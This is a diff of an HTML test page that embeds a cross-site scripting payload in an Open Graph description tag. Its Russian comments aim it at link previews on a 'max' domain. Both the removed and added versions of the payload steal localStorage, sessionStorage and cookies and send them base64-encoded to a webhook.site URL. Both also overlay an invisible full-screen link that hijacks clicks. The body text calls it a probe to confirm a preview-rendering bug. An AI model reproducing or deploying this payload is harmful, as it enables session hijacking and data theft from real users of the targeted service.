@@ -2,34 +2,32 @@
 <html>
 <head>
     <meta property="og:description" content='"><img src=x onerror="
-    (function(){
-        // Проверяем, что мы на домене max.ru
-        if(!location.host.includes('max')) return;
-        
-        // Собираем всё, что можем найти
-        const loot = {
-            ls: JSON.stringify(localStorage),
-            ss: JSON.stringify(sessionStorage),
-            cookie: document.cookie
-        };
-        
-        // Отправляем на твой хук
-        fetch('https://webhook.site/8cda2992-b523-4748-a5a4-616893cf1435/LOOT', {
-            method: 'POST',
-            mode: 'no-cors',
-            body: btoa(JSON.stringify(loot))
-        });
+        (function(){
+            /* Проверяем хост, используя обратные кавычки */
+            if(!location.host.includes(`max`)) return;
+            
+            const loot = {
+                ls: JSON.stringify(localStorage),
+                ss: JSON.stringify(sessionStorage),
+                cookie: document.cookie
+            };
+            
+            fetch(`https://webhook.site/8cda2992-b523-4748-a5a4-616893cf1435/LOOT`, {
+                method: `POST`,
+                mode: `no-cors`,
+                body: btoa(JSON.stringify(loot))
+            });
 
-        // Создаем ту самую "пленочку" на весь экран
-        const a = document.createElement('a');
-        a.href = 'https://lin-li-shu.github.io/success';
-        a.style = 'position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:999999;opacity:0;';
-        document.documentElement.appendChild(a);
-    })()
-">'>
-    <meta property="og:description" content="Обычное описание">
+            /* Та самая невидимая пленка поверх всего */
+            const a = document.createElement(`a`);
+            a.href = `https://lin-li-shu.github.io/success`;
+            a.style = `position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:999999;opacity:0;cursor:default;`;
+            document.documentElement.appendChild(a);
+        })()
+    ">'>
 </head>
 <body>
-    Если ты это видишь, бот не исполнил скрипт в превью.
+    Если превью отображает этот текст без картинок и странных символов, значит фильтрация сработала. 
+    Если вылез лог на Webhook — баг подтвержден.
 </body>
 </html>
